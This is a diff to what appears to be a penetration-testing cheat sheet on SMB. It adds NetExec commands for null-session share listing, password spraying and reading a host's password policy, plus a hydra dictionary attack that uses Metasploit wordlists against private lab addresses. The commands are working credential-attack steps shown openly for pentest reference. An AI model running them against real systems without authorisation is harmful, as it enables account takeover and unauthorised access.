@@ -17,12 +17,32 @@ netexec smb 172.16.8.139
 # Check if guest is not disabled
 netexec smb 172.16.8.139 -u guest -p '' --shares
 
+# Null sessions
+netexec smb 172.16.8.139 -u '' -p '' --shares
+
 # Check SMB Service on subnet
 netexec smb 172.16.8.139/24
 
 # Check null auth
 smbclient -L 192.168.1.2 --no-pass
 smbclient //192.168.1.2/public --no-pass
+```
+{% endcode %}
+
+### Dictionary Attack and Password Spraying
+
+Dictionary attack with username and password lists.
+
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.10.1 smb2
+```
+
+Password spraying with NetExec
+
+{% code overflow="wrap" %}
+```bash
+netexec smb 10.10.10.1 -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p 'Passw0rd' --continue-on-success
 ```
 {% endcode %}
 
@@ -53,6 +73,14 @@ Enum disk
 {% code overflow="wrap" %}
 ```bash
 netexec smb 172.16.8.140 -u 'Administrator' -p 'Password123' --disk --local-auth
+```
+{% endcode %}
+
+Check password policy on Domain/Workstation
+
+{% code overflow="wrap" %}
+```bash
+netexec smb 10.4.19.75 -u 'administrator' -p 'passw0rd' --pass-pol
 ```
 {% endcode %}
 
